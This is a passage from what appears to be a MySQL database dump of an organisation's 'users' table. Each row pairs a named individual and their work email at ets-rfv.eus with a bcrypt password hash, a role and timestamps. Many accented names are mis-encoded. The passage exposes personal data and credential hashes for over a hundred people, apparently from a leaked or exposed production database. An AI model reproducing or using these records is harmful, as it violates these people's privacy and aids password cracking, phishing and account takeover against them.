Perez','','$2y$10$HTrgaNqxp6mCVkM5EUoUROwymGHbDe9ijvWUAEvmv0vS6Yr4x8OhK','aperez@ets-rfv.eus',2,247,1,'2019-09-17 13:27:31','2019-09-17 13:44:06'),(61,'roferna','Roberto Fernandez','','$2y$10$9jE6WadW/VQiM/qCUxKK7.Gp9Ho1xQvQp7zxnRjVP3SlF/6L/.Z5u','rfernandez@ets-rfv.eus',2,136,1,'2019-09-18 05:13:45','2019-09-18 05:56:12'),(62,'jotorro','Josu Torrontegui Goicoechea','','$2y$10$W3jGv7r16HM34nmqqFRoaOPOoqogLCqfW4vDrr4gLPRVg640q1gP6','jtorrontegui@ets-rfv.eus',2,363,1,'2019-09-18 07:21:26','2019-09-18 07:50:30'),(63,'olbilba','Olaia Bilbao Onaindia','','$2y$10$/y4f0.8Wm6nrG7magpw47utxcnAkMaxO2PoMPz7m.w0SFgpwPMQCS','obilbao@ets-rfv.eus',2,406,1,'2019-09-18 13:00:54','2019-09-19 05:42:27'),(64,'Elarcem','Elias Arce Macarron','','$2y$10$xHvUdAmMnjaTc461RmLxw.DvCedREcObK4w9epXfi0Xz8bw4Gv6aG','earce@ets-rfv.eus',2,233,1,'2019-09-18 15:16:17','2019-09-18 17:24:25'),(65,'josanzm','Jon Sanz Martinez','','$2y$10$XTNhAKPTWxMhxwOXv4Mm6.ffBpJ3o17gpgCiC9.BFwtQ/qi.TrwS.','jsanzm@ets-rfv.eus',2,394,1,'2019-09-19 06:55:14','2019-09-19 07:09:26'),(66,'jourber','Jon Urberuaga Lizaranzu','','$2y$10$EOKUHFGwEN9Jl.fZApEBG.9e2ad7nHHbXhCOcATecxqN2kiL4Ag7a','jurberuaga@ets-rfv.eus',2,358,1,'2019-09-19 07:01:05','2019-09-19 07:08:41'),(67,'lacoboc','Lander Cobo Cabada','','$2y$10$ecgujkIAbmXpclZakGR8lebAnnJcDUk9kZhaLb.9hn8BvO4MxN/UK','lcobo@ets-rfv.eus',2,382,1,'2019-09-19 07:04:16','2019-09-19 07:07:29'),(68,'jovazqu','Jose RamГіn VГЎzquez Castro','','$2y$10$S6KZcKjt68Qqzy8tUYQ/6eUEiKTKlIpizbyLxT3OjdBnn6N6KECTe','jvazquez@ets-rfv.eus',2,140,1,'2019-09-19 11:18:26','2019-09-19 11:19:00'),(69,'nucarba','Nuria Carballido FernГЎndez','','$2y$10$.AlcpGmFD5TsTr5zfa8IWuGWKzRzvc56fpwX5kZllV8O1Ys/pGJcm','ncarballido@ets-rfv.eus',2,191,1,'2019-09-20 11:33:33','2019-09-20 11:33:50'),(70,'jotorre','Jorge Torres Castellanos','','$2y$10$upMlmUB3iHLMbLjctWkXpOn23hqPvuXTE7xEmpwoVn8j0dxRlbsAK','jtorres@ets-rfv.eus',2,276,1,'2019-09-21 15:13:24','2019-09-21 16:01:50'),(71,'jamarti','Jose A. MartГӯn Cividanes','','$2y$10$DjFIolWs.TUP5clRQE5SYuOmOkkyPEuK1Lbbo3IuLPVo1Ldvjwc/m','jmartin@ets-rfv.eus',2,NULL,1,'2019-09-23 08:08:10','2019-09-23 08:08:10'),(72,'aiaretx','Ainoa Aretxabaleta','','$2y$10$6a8sRRGbhC7FTbjOrVi4meaYyN/DHnou7DQGYV7u.wNcMbTIg.41i','marechavaleta@ets-rfv.eus',2,217,1,'2019-09-24 07:04:00','2021-02-15 13:31:11'),(73,'inurbiz','IГұigo Urbizu RincГіn','','$2y$10$ukSF./J3xyWxDeDKyS.UFueYuau0VbEszhz4EsxLmHl8BpUXeqLFm','iurbizu@ets-rfv.eus',2,356,1,'2019-09-26 12:56:50','2019-09-26 13:13:10'),(74,'alpascu','Alberto Pascual','','$2y$10$BfCy8IXuFNkaRUlPLObp4.I2eIOAhtl8YHPsPkpIrln6ZNdrXYNIi','apascual@ets-rfv.eus',2,253,1,'2019-09-26 15:20:47','2019-09-26 16:37:57'),(75,'egurqui','Egoitz Urquiza Calleja','','$2y$10$s83coGiyIxFe95u66kik9u.EaTvGZEGvHtMjVCBPOhCj9LUtlTqt.','eurquiza@ets-rfv.eus',2,402,1,'2019-10-07 04:41:14','2019-10-07 05:15:13'),(76,'aldepaz','Alberto de Paz del Campo','','$2y$10$s3YYwSbsNkPj0GokQ.sAWeomRoGTM/lDUuDKSYDDYPJDTCmwLmfTK','adepaz@ets-rfv.eus',2,403,1,'2019-10-10 19:57:44','2019-10-11 03:13:30'),(77,'raprest','RamГіn Prestamero Bezares','','$2y$10$iT90T.NOFRea5i2/ZgqWzequuU1IBmHPfYlURrk1Oie4cDd5OtzBa','rprestamero@ets-rfv.eus',2,379,1,'2019-10-17 12:41:51','2019-10-17 13:16:10'),(78,'mimiran','Miguel Miranda Igual','','$2y$10$26l7Mh6.pFAwOfsJiXfGNeS.1RNz2yNw4C6hteJ5XRvSkuquYtm4K','mmiranda@ets-rfv.eus',2,192,1,'2019-10-26 12:16:39','2019-10-26 12:49:47'),(79,'camarti','Carlos Martinez Buruaga','','$2y$10$QJmuayPZEIZUqi9T4VdlE.Eu6fhQEZKnEVD2dCQ9VMoQIB9fmsEOW','cmartinez@ets-rfv.eus',2,395,1,'2019-11-03 04:39:32','2019-11-05 15:25:35'),(80,'jozaldi','Jon Zaldivar Garcia','','$2y$10$EhtmWQwuZ2YigvZc40546OrejfdPDR.5ic0J6VuEr42gD7tZzJ3ZG','jzaldivar@ets-rfv.eus',2,413,1,'2019-11-06 08:01:08','2019-11-06 08:31:08'),(81,'arpagol','Aritz Pagola Alvarez','','$2y$10$j//W1Q2YwfavfMQJqkhon.LhIretF5LPWisS6AScqINsi2z1uEj9G','apagola@ets-rfv.eus',2,393,1,'2019-11-15 14:16:49','2019-11-18 06:35:49'),(83,'luferna','Luis Fco. FernГЎndez Santiago','','$2y$10$q0sBqL5a2Oi8vGl8CuMnlughKbhjyv.v6Z0z23s2u3CxaOTnPoQui','lfernandez@ets-rfv.eus',2,88,1,'2019-11-21 06:16:48','2019-11-21 06:17:11'),(84,'jumonro','Juan Carlos Monroy','','$2y$10$79w8Q9eV5UIIrYE8bHI5gewVRsA5Rn1wld3q9bEPBsAiWA8LV8Jfu','jmonroy@ets-rfv.eus',2,171,1,'2019-12-10 11:11:37','2019-12-10 11:22:43'),(85,'frlopez','Francisco Javier Lopez Rogado','','$2y$10$1urjdJKiZmImmtIFXxWm9Ob.kQz8CIKHl5axdvxHOhxnGYGcqWvr2','flopez@ets-rfv.eus',2,229,1,'2020-01-07 19:37:52','2020-01-08 07:45:35'),(86,'alsanch','Alberto SГЎnchez','','$2y$10$wMggF8ULT/Wtx8uA2z/Piu2bW9ABgBWx7McJpy2jJIINWHzfbV3J2','asanchezo@ets-rfv.eus',2,371,1,'2020-01-14 16:12:53','2020-01-14 17:10:43'),(87,'aikarea','Ainhoa Kareaga Quecedo','','$2y$10$iwu9hlQp3krqndVccCLKGO03AlRn20EJNurDn76UHEpNMoL74ffB.','akareaga@ets-rfv.eus',2,306,1,'2020-01-29 08:47:14','2020-01-29 08:49:15'),(88,'rojimen','Roberto Jimenez','','$2y$10$8LNZYrz8gkaKg.qET5phsOMHTZa68x8puPWKAWUPTHibreeMt7RZy','rjimenez@ets-rfv.eus',2,277,1,'2020-02-21 11:32:34','2020-02-21 18:01:06'),(89,'angorro','Ander Gorrotxategi Legarra','','$2y$10$RzoeBhos65N6CxkvoiBTz.U4YCdzS46Pf8/KNVSbUQiWsPa3Kbqzm','agorrotxategi@ets-rfv.eus',2,NULL,1,'2020-03-04 18:14:25','2020-03-04 18:14:25'),(90,'xaorteg','Xabier Ortega Gonzalez','','$2y$10$L/HFpCFPqU4IDSU0soSeWufMznlxrZQYyB77UHMTvliue9VUQtTT6','xortega@ets-rfv.eus',1,1000,0,'2020-03-05 11:58:13','2020-09-15 09:25:47'),(91,'iozumal','Ion Zumalabe','','$2y$10$v5S.R6nY4FtUzAuzdq0ZWuWo4wohF7o5atiBW2dXEOvJudHVRfz3S','izumalabe@ets-rfv.eus',2,129,1,'2020-03-11 10:31:22','2020-03-11 10:36:26'),(92,'jusilva','Juan Silva MartГӯn','','$2y$10$.c79V97YnFenbAcSNsJj2ejtrpNJSLxT8n8XhvZcyiMxc9WNlWzuC','jsilva@ets-rfv.eus',2,418,1,'2020-04-30 11:23:49','2020-04-30 11:24:17'),(93,'fecarce','Federico Carcedo','','$2y$10$.E8djQu0FBKM0TFwedXK1OTMN8jJ/O4CsYuqJskXLs8qs9yTXrc4m','fcarcedo@ets-rfv.eus',2,228,1,'2020-05-20 13:21:17','2020-05-21 06:08:07'),(94,'aibilba','Aitor Bilbao Altonaga','','$2y$10$s3zLz7RdhvN5D6d0nJFdAe4bKZHt623Gjz6DFMvnL0zg454dai0/2','abilbao@ets-rfv.eus',2,417,1,'2020-06-04 19:31:25','2020-06-05 03:09:05'),(95,'idarrie','Idoia Arrieta','','$2y$10$CGWD6BvrU4S4DyrBhe6KuOEqkAyHXg1Pyz7PfFdmWjWqQgZN3OA9W','iarrieta@ets-rfv.eus',2,284,1,'2020-06-05 06:29:16','2020-06-05 06:35:25'),(96,'roruizg','Roberto Ruiz Garcia','','$2y$10$UV/HZOOAXDuiA4VuAxd88.D8ioKnMK65ByZSodb8W0H6x54fOlPiG','rruiz@ets-rfv.eus',2,287,1,'2020-06-05 07:11:41','2020-06-05 07:31:21'),(97,'istapiz','Ismael Tapiz','','$2y$10$4gDbmUg7SVomsGkkBy5w/u9wtX2zcxJmyQ752iaaXhMXbh3ekuANO','itapiz@ets-rfv.eus',2,181,1,'2020-06-05 08:05:23','2020-06-05 08:09:51'),(98,'jeansae','JesГәs MarГӯa Ansa Etxeberria','','$2y$10$t0Vqzs8SYVwm0iYt36JaKueu/o4pzz4McI0dhTRwhjy1N4ThiN5si','jansa@ets-rfv.eus',2,102,1,'2020-06-05 11:10:05','2020-06-05 11:11:28'),(100,'joleonc','Jose Luis Leon Cendoya','','$2y$10$B8JmZVfz3mJxUQcPjqs4JOKuBsTztL4xT7/Yht4ajA5Eh2coT6XXa','jleon@ets-rfv.eus',2,155,1,'2020-06-06 05:19:43','2020-06-06 05:49:04'),(101,'gomalax','Gontzal Malaxetxebarria OlaГұeta','','$2y$10$uwNr7srivYdG7UMDHEc7Z.cYWuMFXQrzLftj4tQm1FAg8ohKH/6ti','gmalaxetxebarria@ets-rfv.eus',2,89,1,'2020-06-06 07:54:50','2020-06-06 13:05:50'),(102,'miibane','Miren IbaГұez','','$2y$10$V3agPBFJyXalYU/No//tBOE3S1rE1U3Ev4IYbm59wOZVCs401nfiy','mibanez@ets-rfv.eus',2,179,1,'2020-06-07 15:26:59','2020-06-07 18:13:56'),(103,'jollano','Joseba Llano','','$2y$10$mZcGDsVBiXsKpLt4qAD37OOF5izpsvqmed7UxpH.9wX.ACrmzmiE6','jllano@ets-rfv.eus',2,150,1,'2020-06-08 04:00:49','2020-06-08 04:08:17'),(104,'agromer','AgustГӯn Romero GarcГӯa','','$2y$10$k3EnLeCobGb3gQ.0la0Ui.xBNeKIiPGgkdXPEtA/dCTSaNk0TFZhK','aromero@ets-rfv.eus',2,73,1,'2020-06-08 16:23:41','2020-06-08 16:37:06'),(105,'jolarraz','Jon Txaber Larrazabal Calvo','','$2y$10$dpAdrilV/2qlRgQ.R21VTOiCnE1hCnVL.drdyd2lMW.Sk.qfHhJea','jlarrazabal@ets-rfv.eus',2,426,1,'2020-07-22 11:31:46','2020-07-22 12:03:30'),(106,'ibjaure','Iban Jauregui Erquicia','','$2y$10$bDyreq6/1F8CyNzx9FKMzuESfdHKwADNvJIh7qzSuQHzxUa1l4KWa','ijauregui@ets-rfv.eus',2,425,1,'2020-07-25 12:58:16','2020-07-25 18:21:47'),(107,'lusanch','Luis Miguel Sancho Cuevas','','$2y$10$wS7ObRFFJoI2Pi2/7g2FouxJDUu8EE48nYTh2dKuwSHt90MO7cz7G','lsancho@ets-rfv.eus',2,407,1,'2020-08-11 15:38:08','2020-08-12 05:43:02'),(108,'aigartz','Aitor Gartzia Lersundi','','$2y$10$GW8Lc8477bo9je0RrrNuXOLkplzqB4nyphpiC8jpj1nWjib2XJac6','agartzia@ets-rfv.eus',2,424,1,'2020-09-09 08:43:48','2020-09-09 08:53:07'),(109,'eiuriar','Eihar Uriarte MuГұoz','','$2y$10$4SYKQ4kvDmg3NGTNCdJae.B0IyuAHQtPlxYOmcQPvEVN2jMZBm/kW','euriarte@ets-rfv.eus',2,432,1,'2020-09-18 00:07:01','2020-09-18 04:48:55'),(110,'fearetx','FГ©lix Aretxaga DГӯez','','$2y$10$ZwU.lA8ygywx.laXgqC4ZuIvMc3bEwoFEC3Dz.AqYCuhc.higEU2O','farechaga@ets-rfv.eus',2,218,1,'2020-09-25 14:24:47','2020-09-25 16:25:20'),(111,'igdiezr','Igor Diez Ruiz','','$2y$10$ec6BguP/4LeXqtMT8aD85OrCmL4uqmfsNDoMVii3OoEfkLQ3bobVa','idiez@ets-rfv.eus',2,427,1,'2020-09-30 07:24:36','2020-09-30 07:33:27'),(112,'mamadin','Markel Madinabeitia Bolinaga','','$2y$10$dRQ9R9ARypVkTr61xeghhOxTD7LmguZzq/QhyeG3kGujcdbzuPmAe','mmadinabeitia@ets-rfv.eus',2,428,1,'2020-10-15 13:42:54','2020-10-15 15:49:37'),(113,'alaurre','Alex Aurrekoetxea Zurinaga','','$2y$10$hzqpMtHNqrRPd//WH.3owOfImqLBVYJlcM2dpgJAr5p/4nC3SG2Na','aaurrekoetxea@ets-rfv.eus',2,423,1,'2020-11-02 11:04:08','2020-11-02 11:09:00'),(114,'jogilma','Jose Manuel Gil MartГӯnez','','$2y$10$7Xr1Udc5v2u4glI45.A1nOOlZ4UQ7PubjKZnsT2g4KjkQqieYhRfW','jgil@ets-rfv.eus',1,NULL,0,'2020-11-17 19:08:53','2020-11-17 19:51:57'),(115,'jaartab','Jaione Artabe Badiola','','$2y$10$O44mBH1UYAOaUH9mLhMTAe09yCxbbWSNEGGM1SC0G1a6oQsr41Ox6','jbadiola@ets-rfv.eus',2,431,1,'2020-12-11 11:23:07','2020-12-11 11:24:03'),(116,'emlopez','Emilio Lopez Martin','','$2y$10$OhmVkzy5sn.hAVRvMotbe.EmQL1uV560WE8FcozLz8d0EE4m.bvSm','elopez@ets-rfv.eus',2,NULL,1,'2021-01-10 15:45:02','2021-01-10 15:45:02'),(117,'ielande','Ieltxu Landeta Lexartza','','$2y$10$9rek9ZISG4RcARP7EXMS5untq.u7SeQXxp5ZpZxErHq3sCYr6XdkO','ilandeta@ets-rfv.eus',2,421,1,'2021-01-26 18:18:59','2021-01-27 03:53:20'),(118,'irugald','Iratxe Ugalde Vesga','','$2y$10$zievH4MbsaZtJ4oZNiT3vOroHJIKUP8kFqVzKE./xYvqFyZiml9VG','iugalde@ets-rfv.eus',2,442,1,'2021-01-27 13:36:09','2021-01-27 13:36:59'),(119,'maetxei','Marisa Etxeita Gandiaga','','$2y$10$bm/VbyA0QqMBWvf1NVtPGO3a1yaQISWRxhVFWL/DhEsXbqcl1KXsO','metxeita@ets-rfv.eus',2,429,1,'2021-02-04 14:17:23','2021-02-04 14:18:24'),(120,'gomaezt','Gorka Maeztu Fradua','','$2y$10$YkO/aBhJLK/AWMRC6/HWIOfQpX4JR0cTGACeJh.FcRhHcBHquouqe','gmaeztu@ets-rfv.eus',2,435,1,'2021-02-09 00:53:44','2021-02-09 07:23:10'),(121,'jogalar','Jon Galarreta Orio','','$2y$10$BYAlykNrC8rcz8tZN7yyZua/AUE/sw47d07FNeiq0VCab0TP0JP2C','jgalarreta@ets-rfv.eus',2,422,1,'2021-02-10 11:38:58','2021-02-10 11:39:52'),(122,'anmarti','Ana Isabel Martinez Marcos','','$2y$10$Db.BapVrtunpjPEmdg0DbeCOJVhQeJUYOY8CogL/.BEKSzJ9D0mZm','amartinez@ets-rfv.eus',2,443,1,'2021-03-03 10:50:42','2021-03-03 10:51:35'),(123,'kagarro','Karmele Garro Michelena','','$2y$10$Nii14kVVuYgHsG26t8TlKe7jMR/cPtgyn8ZXkbOf8.cMu.klGMxOC','kgarro@ets-rfv.eus',2,450,1,'2021-05-19 09:52:45','2021-05-19 09:56:05'),(124,'encalav','Eneko Calavera Conde','','$2y$10$/a4qCmiutzO5aLmkgoFuzOlzl4bIjdJOdVUsRtnSWG7e.YH8pUqbO','ecalavera@ets-rfv.eus',2,456,1,'2021-07-15 08:58:21','2021-07-15 10:42:58'),(125,'mimante','Mikel Manterola Arruti','','$2y$10$Nn2fd2qwu.ByS3sKNLy03.zmqBxF0OxsAXetai62SVbyS8RvXicRG','mmanterola@ets-rfv.eus',2,448,1,'2021-07-29 11:43:06','2021-07-29 11:53:34'),(126,'haetxeg','Haritz Etxegarai Matxain','','$2y$10$Jd4ouBKPcjogwyFSbdfE5ubeQEFBj2vDGevbooPeMnr80Em00mWnm','hetxegarai@ets-rfv.eus',2,457,1,'2021-09-01 16:45:14','2021-09-01 17:55:11'),(127,'alnunez','Alexis NuГұez Aranburu','','$2y$10$SnGmkYTPWH.2EKebWKW.YuSCQN35DqsBXRPAR/skTdPcQyb/phB2a','anunez@ets-rfv.eus',2,455,1,'2022-01-04 15:18:09','2022-01-04 15:19:01'),(128,'ailasac','Aitor Lasa Castrillejo','','$2y$10$XlBGYyzQryJoMFNMmwtOJeKWapu04HswpC234n8s2RtvBWjErcMb6','alasa@ets-rfv.eus',2,458,1,'2022-01-30 21:22:53','2022-01-30 22:07:10'),(129,'saelhad','Samir El Hadri Boukouh','','$2y$10$QIvhXQaZICv.hItXefnW3uTpV/8i9aSjf9gzxBe2D2jvIt/pxNn8u','selhadri@ets-rfv.eus',2,451,1,'2022-01-31 13:03:34','2022-01-31 13:05:09'),(130,'kasanto','Karlos Santos Alonso','','$2y$10$DtZ4lsiWfyOkZCFX9NHkvuIsy9lHbmb8Tuclg1FxDzc.Tu88K8cqO','ksantos@ets-rfv.eus',2,459,1,'2022-02-14 12:15:11','2022-02-14 12:28:27'),(132,'naelhad','Nabil El Hadri Boukouh','','$2y$10$bF4P.jq89GRylVkxHhor8ub5bG/J6taD/gRnEjAuUbx3ysQ92.Ile','nelhadri@ets-rfv.eus',2,449,1,'2022-03-04 08:30:32','2022-03-04 08:37:04'),(133,'pesanti','Pedro Santiago Mingo','','$2y$10$sWymiQXSjxjhgjnIgme7OuHRlHEjtdsvqBXI7qtWiDbqzpljY65Ji','psantiago@ets-rfv.eus',2,NULL,1,'2022-03-23 07:17:30','2022-03-23 07:17:30'),(134,'ibtomee','Ibon Tome Echevarria','','$2y$10$mnr0.IdOIg1UocHWfU.iEeaNNCDrbuR7PjxbnzWB2Icq/wrLEq0YG','itome@ets-rfv.eus',2,467,1,'2022-06-15 12:06:36','2022-06-15 12:07:31'),(135,'oisegur','Oihane Segura Garcia','','$2y$10$0zUNrkpPJOi31bqDHavdQOFXeSTDvmSRXwxEw0Serpw/ktHOYQILa','osegura@ets-rfv.eus',2,469,1,'2022-06-28 04:04:01','2022-06-28 04:20:51'),(136,'ansanzg','Ander Sanz Gurrutxaga',NULL,'$2y$10$zBM/j6POu/pVxAeV9LIHte4skSFRo/uAmy08aBAaFjt50d16thV/6','asanz@ets-rfv.eus',2,465,1,'2023-01-10 13:24:57','2023-01-10 13:38:19'),(137,'boaspiu','Borja Aspiunza Ibarrola',NULL,'$2y$10$k2UILk5LXHVfGGUkg0JA2OZuMAH4eSlnSDlLkfD5pOmeHhSPmJE.q','baspiunza@ets-rfv.eus',1,NULL,1,'2023-02-09 11:31:32','2023-02-09 11:32:16'),(138,'gorolda','Goizalde RoldГЎn',NULL,'$2y$10$IK1Pv8heRcZSC0NW7nBhIuJOKecnYoni1K20/Ye5raDLdVyPpn3oK','groldan@ets-rfv.eus',2,NULL,1,'2023-02-27 11:18:23','2023-02-27 11:18:23'),(139,'cailiea','Catalina Cristiana Illie',NULL,'$2y$10$NN9yp8fIFb1B7Ex/9ABEqeB9kCnPX160PItDPv2OKuuAdJCo4X3O.','cilie@ets-rfv.eus',2,464,1,'2023-03-15 20:22:58','2023-03-15 21:01:06'),(140,'misalgu','Mikel Gotzon Salguero Torre',NULL,'$2y$10$PW2YFzXgAirRdPhCA9cBBOxUCWNxlIuAWXS82MeOz6zwXHdulwyz6','msalguero@ets-rfv.eus',2,369,1,'2023-04-21 06:43:44','2023-04-21 06:44:47'),(141,'unmugic','Unai Mugica Torrontegui',NULL,'$2y$10$B81.SzvpdZieuDzkKlGLOuac9SRK23W.I0JAQSZN3LNGcvwMKBoT6','umugica@ets-rfv.eus',2,NULL,1,'2023-05-12 06:55:58','2023-05-12 06:55:58'),(142,'hogolda','Hodei Goldaracena Biela',NULL,'$2y$10$Lpu9HMVHS34x6zzH4F2X5OWUcWqEwRWSNRB6hc5e8jXZqzN3Pb0e2','hgoldaracena@ets-rfv.eus',2,477,1,'2023-06-14 08:15:40','2023-06-14 08:18:16'),(143,'aiisast','Aitor Isasti Castillo',NULL,'$2y$10$Hu7NLmvvnQUVvpPpsmXfaedHiXsCge6fVp9VNu1x7VLbUkpNWEqGC','aisasti@ets-rfv.eus',2,479,1,'2023-07-28 07:12:23','2023-07-28 07:15:11'),(144,'ardiazd','Aranzazu DГӯaz de Cerio GarcГӯa',NULL,'$2y$10$u7d6cuOX4ym5f8y5KxJoSO0UvE5xaEaRDxnoHCjBXmGBLUvLU0W1i','adiazdecerio@ets-rfv.eus',1,NULL,1,'2023-09-05 11:47:23','2023-09-05 11:49:23'),(145,'juachia','Julio Antonio Achiaga Costa',NULL,'$2y$10$Qu2MYGhL34YlL38drB.m8uUidQoty7/ZFgrysQK2W6p0ixU8Iukz2','jachiaga@ets-rfv.eus',2,475,1,'2023-11-15 16:14:06','2023-11-16 06:41:24'),(146,'unortuo','Unai Ortuondo Zuaznabar',NULL,'$2y$10$qxc900ZdCLj.F/gQLzgQ.eSz3tp4J3TXxDz/g3PBSXxm4vbLg9xTe','uortuondo@ets-rfv.eus',2,482,1,'2023-11-19 15:00:58','2023-11-19 17:02:58'),(147,'joazkar','Josu Azkarate Telletxea',NULL,'$2y$10$I7Pe7xFff3uIhcbgEw/Q4O5aKmCjiCz6AjiJk3Jnr8dWppCvTCaQy','jazkarate@ets-rfv.eus',2,476,1,'2024-01-10 06:45:02','2024-01-11 12:37:47'),(148,'jobadio','Jon Badiola Ozamiz',NULL,'$2y$10$CPg4v2KCrmxxWrgp/EpGW.nKv0MviSxmYFAPA1xcylYLHHOzVMp8y','jbadiolaoz@ets-rfv.eus',2,483,1,'2024-01-29 09:14:49','2024-01-29 09:17:28'),(149,'evberaz','Eva MarГӯa Beraza Marzol',NULL,'$2y$10$xi4SUro5QD3rSktoElhIcOwL8uAKJabmpP.4R4iZ7sHKmjb.wZ2.2','eberaza@ets-rfv.eus',2,486,1,'2024-03-13 09:33:08','2024-03-13 09:33:52'),(150,'anatuch','Andoni Atucha Dominguez',NULL,'$2y$10$Aa.CzfMAWZS/UR8sUz8Wnu6zL0O0rrlOvonEh1tWvmreJn4jIZQFC','aatucha@ets-rfv.eus',2,485,1,'2024-04-02 06:42:33','2024-04-02 06:45:35'),(151,'damolin','Daniel Molina',NULL,'$2y$10$MkvF6a2MfhUT/Gey47pjJOvRUz.U9aAhuckbqrhuAP514QzNj7lTC','dmolina@ets-rfv.eus',2,478,1,'2024-04-22 13:13:23','2024-04-22 13:21:08'),(152,'aiirion','Aitor Iriondo Baskaran',NULL,'$2y$10$KZdEl19qMpt3h0o1FHGGFOZBXCXOef4PYDFeA75CbTNcMsXhuG7/K','airiondo@ets-rfv.eus',2,490,1,'2024-05-14 12:07:09','2024-05-14 12:21:38'),(153,'peflore','Peio Flores Gonzalez',NULL,'$2y$10$mkocGZdXFmJHnZVu1oW7geb3.Rb66CtIOWrP0J0GST8oHzAlrq0IO','pflores@ets-rfv.eus',2,489,1,'2024-05-19 19:38:25','2024-05-19 19:39:50'),(154,'damateo','David Mateos Jimenez',NULL,'$2y$10$CGNKU6yIqyIrF6mcjC.pR.X9TxQH4TfjDj8HWeqDrC5m0mMuysaRq','dmateos@ets-rfv.eus',2,492,1,'2024-05-21 07:36:03','2024-05-21 11:47:44'),(155,'ururdia','Urko Urdiain Garrastatxu',NULL,'$2y$10$BQDd4XnGtKLmBwcIGHHty.x7cLbgQZWU8yDlCOkylPBNrga46b8rW','uurdiain@ets-rfv.eus',2,491,1,'2024-05-22 11:57:27','2024-05-22 11:58:35'),(156,'infulla','IГұaki Fullaondo Okina',NULL,'$2y$10$68OiW7m1InGK1GsZewwGz.T4SXoL0X1JxAOgrI9Ni2/6tmIPp3ak2','ifullaondo@ets-rfv.eus',2,487,1,'2024-07-15 12:14:30','2024-07-15 12:36:12'),(157,'aipetri','Aitor Petrikorena Arbelaiz',NULL,'$2y$10$.pLj3UTCtBBaV2yqpYDdBeJjBphWsNmwSZ45867sXg75jqJXY.B/W','apetrikorena@ets-rfv.eus',2,499,1,'2025-02-18 10:01:47','2025-02-18 10:06:00'),(158,'ITCon.vicapat','ITCon Victor Capatina',NULL,'$2y$10$.w3eqk2.MKLCvz3AS1Elhe9oNB2z02skT3KVdID/2FF.B/M2wXC0i','ITCon.vicapat@ets-rfv.eus',2,NULL,1,'2025-06-24 11:52:18','2025-06-24 11:52:18'),(159,'ITCon.angomez','ITCon Angel Gomez',NULL,'$2y$10$TkRF3rh1RuiiPG06y5UxAOZi8KD83h0xN/hpATC7Gz5aD60m8Jz.S','ITCon.angomez@ets-rfv.eus',2,NULL,1,'2025-06-24 12:11:55','2025-06-24 12:11:55'),(160,'unkorta','Unai Korta Aranbarri',NULL,'$2y$10$yJ/KPPxfhFhzv1aevKX5mOAIMjyVk6T6LE8eSYJQTRuB3KiexINLa','ukorta@ets-rfv.eus',2,505,1,'2025-07-31 16:14:10','2025-08-01 05:52:28'),(161,'liplaga','Liher Plagaro  Capanaga',NULL,'$2y$10$JY7lV8AkWVQiTGyNz6cFKeiGCj6xNU3DEkUYW/71mDN1G.WY6hsEe','lplagaro@ets-rfv.eus',2,510,1,'2025-10-01 16:28:42','2025-10-01 17:07:59'),(162,'aiordon','Ainhoa Ordonez Mateos',NULL,'$2y$10$7f/7amhyVNTm54vPHOukL.hWF10U28fiL2Kqi6ebkcc.JNCpIA5IS','aordonezm@ets-rfv.eus',2,509,1,'2025-10-14 09:14:35','2025-10-14 10:55:31'),(163,'gomagun','Gorka Magunazelaia  Zuburruti',NULL,'$2y$10$UtTMSrNxI5LLAkYk2IwCBufbBnmjGKHhQV7X1ZTIg7AFcMU2pYY5i','gmagunazelaia@ets-rfv.eus',2,508,1,'2025-10-14 09:14:42','2025-10-14 10:55:53'),(164,'memurie','Mercedes Leonor Muriel Frias',NULL,'$2y$10$l6jUo4Vqg/ob6ViHB0dKqOOVAMLgLyGalXJ3yCFt7uog6J5a6vlpK','mmuriel@ets-rfv.eus',2,506,1,'2025-10-14 09:14:59','2025-10-14 10:55:07'),(165,'xaargan','Xabier ArgandoГұa GutiГ©rrez',NULL,'$2y$10$FWuuPU71v20OMveLXgwHv.QY/oN356e2dlEyTRKcbTLYVBPIkVTgq','xargandona@ets-rfv.eus',2,507,1,'2025-10-14 09:15:12','2025-10-14 10:54:48'),(166,'goflore','Goizalde Flores Uribe',NULL,'$2y$10$JTk32aKRfXhT6jTjMGY7COiuiRsRGBajQhRjLEE/PuuGJLCRthdjK','gflores@ets-rfv.eus',2,514,1,'2026-01-21 11:55:27','2026-01-23 09:22:13'),(167,'maandue','Maria Andueza FernГЎndez',NULL,'$2y$10$.QhdVtKb/epllv8VEalr/OT8byuGetwwCEvBDXZ9lD3sVyDHLaNk.','mandueza@ets-rfv.eus',2,517,1,'2026-02-02 06:17:43','2026-02-02 06:37:32'),(168,'itpicab','Itxaso Picabea Buenavida',NULL,'$2y$10$SkW2DJyjFH.UaycHXdoFhOKzFd4ZL7WYOoQ4e9qvUmpsEMCsMLFcO','ipicabea@ets-rfv.eus',2,513,1,'2026-02-02 06:36:26','2026-02-02 06:42:08'),(169,'aslopez','Asier LГіpez Felipe',NULL,'$2y$10$m6c3gC1/zbKzeA4/EiuXuONUjqWe4cDfVQBGCob1/4O2d7JWKdVIq','alopezfelipe@ets-rfv.eus',2,515,1,'2026-03-05 06:54:20','2026-03-05 06:58:23'),(170,'juperur','Juan Miguel Perurena Liceaga',NULL,'$2y$10$VbDGVF76DZh.ILxs4uYlh.k1GpAcxAkDITn.NhzGqyh10YZakyg2y','jperurena@ets-rfv.eus',2,519,1,'2026-03-10 11:53:51','2026-03-10 11:57:22'),(171,'ijgarme','IГұaki Jon Garmendia Murillo',NULL,'$2y$10$UgP.aFXsVpaVlWj6z8OgqOaI21MuluyzFjCs8Z6iOEFi8hoJdfd3q','igarmendia@ets-rfv.eus',2,523,1,'2026-03-30 10:29:50','2026-03-30 10:42:07'),(172,'zuberga','Zuhaitz Bergara Astobiza',NULL,'$2y$10$fOriwIG2u86w7VtvgGDI9.fc0NTRtNAhaaUGqb7hJbqVCx6ktY6vO','zbergara@ets-rfv.eus',2,522,1,'2026-03-30 10:29:52','2026-03-31 09:07:55'),(173,'elloiti','Ellande Loiti Vitoria',NULL,'$2y$10$5oTRo.Ac62egI3LGtzOm/OUSxM6kDjtTk8jvRgQJwb9ivBcOw4swC','eloiti@ets-rfv.eus',2,524,1,'2026-04-10 12:10:42','2026-04-11 04:12:40'),(174,'hatroit','Harritokieta TroitiГұo Berasategi',NULL,'$2y$10$Sn3igWw3bM9fS.uuQc7TeOpfWtVJ62.2nKG5EWVyjup1TmFbcJZRm','htroitino@ets-rfv.eus',2,518,1,'2026-05-02 23:21:09','2026-05-04 05:19:19');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users_roles`
--

